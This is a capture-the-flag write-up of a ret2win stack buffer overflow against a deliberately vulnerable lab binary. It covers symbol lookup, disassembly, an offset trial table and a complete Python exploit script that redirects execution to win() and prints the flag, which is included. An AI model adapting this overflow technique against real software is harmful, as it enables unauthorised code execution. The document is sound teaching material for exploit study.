# ret2win-overflow: my writeup

By Gavin Blacklock

The program has a door with no handle. `win()` prints the flag and
nothing in the normal flow calls it, so I had to bend the program's
own return path to land there. No debugger in this environment, no
pwntools: plain Python, `nm`, `objdump`, and a set of trials I could
count.

## What I tried first that did not work

I built it and ran it politely first. The linker warns about `gets`
while building, which tells you everything about the era this bug
comes from:

```console
$ ./build.sh
/usr/bin/ld: vuln.c:(.text+0x67): warning: the `gets' function is dangerous and should not be used.
```

Normal input, normal exit:

```console
$ printf 'hello\n' | ./vuln
Say something: You said: hello
Nothing happened. Try again.
```

Exit code 0. Then I pushed on it with a flat 80 characters and no
plan:

```console
$ python3 -c "import sys; sys.stdout.write('A'*80+'\n')" | ./vuln
Say something:
```

That run died. When I ran the same input through a small Python
harness so I could see the return code cleanly, this is what I got:

```text
returncode: -11 (-11 is SIGSEGV on Linux)
```

So the overflow is real and 80 plain bytes crash the program, but a
crash is not control. The return address was holding `0x41414141`,
the letter A, which points nowhere useful. I needed two numbers:
where `win()` lives, and exactly how far into my input the return
address sits.

## Getting the win address

The binary is built with `-no-pie`, so addresses do not move between
runs, and symbols are present:

```console
$ nm vuln | grep -E " win$| vuln$| main$"
000000000040123f T main
00000000004011e6 T vuln
00000000004011b6 T win
```

`win()` is at `0x4011b6`. That is the second number sorted.

## Finding the offset

The disassembly of `vuln()` gave me the hypothesis:

```console
$ objdump -d -M intel vuln
```

```asm
00000000004011e6 <vuln>:
  4011ea:  push   rbp
  4011eb:  mov    rbp,rsp
  4011ee:  sub    rsp,0x40
  ...
  401215:  lea    rax,[rbp-0x40]   ; the buffer starts here
  401219:  mov    rdi,rax
  40121c:  call   4010a0 <gets@plt>
```

Buffer at `rbp-0x40` means 64 bytes of buffer, then the 8 byte
saved `rbp`, then the saved return address. Hypothesis: offset 72.

A hypothesis is not a result, so I tested it the slow way. I fed
the program the address of `win()` after padding of 56, 64, 68, 72,
and 80 bytes, one run each, and recorded the return code and
whether the flag appeared. Real output from that trial script:

```text
padding= 56  returncode=   0  flag_printed=False
padding= 64  returncode=  -4  flag_printed=False
padding= 68  returncode= -11  flag_printed=False
padding= 72  returncode=   0  flag_printed=True
padding= 80  returncode= -11  flag_printed=False
```

That table is the proof. Close is not good enough here: 68 crashes,
80 crashes, and only 72 prints the flag. Offset confirmed at 72,
which is 64 bytes of buffer plus 8 bytes of saved `rbp`, exactly as
the disassembly said.

One honesty note on alignment: on some binaries a jump like this
lands with the stack misaligned and the target dies inside a libc
call, and the fix is to put a plain `ret` gadget address in front
of the target so the stack shifts by 8. It did not bite here. I ran
the finished exploit three times in a row and got the flag three
times, so I added no gadget. Adding one anyway would have been
decoration, not engineering.

## The full solution

The exploit in `exploit.py` is short enough to read in one pass.
It packs with `struct` and feeds the payload through `subprocess`:

```python
#!/usr/bin/env python3
import struct
import subprocess
import sys

WIN = 0x4011B6  # from: nm vuln  ->  00000000004011b6 T win
OFFSET = 72     # found by incremental padding trials, see WRITEUP.md

def main() -> int:
    payload = b"A" * OFFSET + struct.pack("<Q", WIN) + b"\n"
    proc = subprocess.run(["./vuln"], input=payload, capture_output=True)
    sys.stdout.buffer.write(proc.stdout)
    sys.stderr.buffer.write(proc.stderr)
    print(f"[exploit] vuln exited with code {proc.returncode}")
    return 0 if b"SALVO{" in proc.stdout else 1

if __name__ == "__main__":
    raise SystemExit(main())
```

The payload is just two parts: 72 bytes of the letter A, filling
the buffer and the saved `rbp`, then the address of `win()` in
little endian, sitting exactly where `vuln()` expects its return
address to be. When `vuln()` returns, it returns into `win()`.

The winning run:

```console
$ python3 exploit.py
Say something: You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<raw address bytes>
You made it to win(). Flag: SALVO{r3t2w1n_0v3rfl0w}
[exploit] vuln exited with code 0
```

The `<raw address bytes>` note marks where the terminal showed the
address bytes of `win()` as raw output: a control byte and an `@`
for `0x40`, printed back as text by the `You said` line before the
return happens. Ugly, and exactly what I wanted to see.

## Flag verified

```text
SALVO{r3t2w1n_0v3rfl0w}
```

Verified by running `python3 exploit.py` against the binary built
by `build.sh` in this session, three times, with the flag printed
every time. The lesson I take from this one: the offset is the
exploit. The address is one `nm` command, but the offset has to be
earned with trials, and a table of failed lengths is worth more
than a lucky guess that happens to work once.
